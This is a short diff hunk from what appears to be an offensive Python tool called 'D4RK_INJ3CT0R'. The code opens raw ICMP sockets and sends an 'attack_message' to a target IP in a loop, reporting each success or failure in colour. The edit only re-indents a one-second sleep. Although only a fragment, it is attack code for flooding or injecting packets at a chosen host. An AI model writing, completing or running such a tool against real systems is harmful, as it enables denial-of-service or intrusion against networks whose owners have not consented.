@@ -77,7 +77,7 @@ class D4RK_INJ3CT0R:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
                 sock.sendto(attack_message.encode(), (target_ip, 0))
                 print(colored(f"Sent {attack_message} to {target_ip}", "green"))
-              time.sleep(1)
+                time.sleep(1)
             except Exception as e:
                 print(colored(f"Failed to send {attack_message} to {target_ip}: {e}", "red"))
 
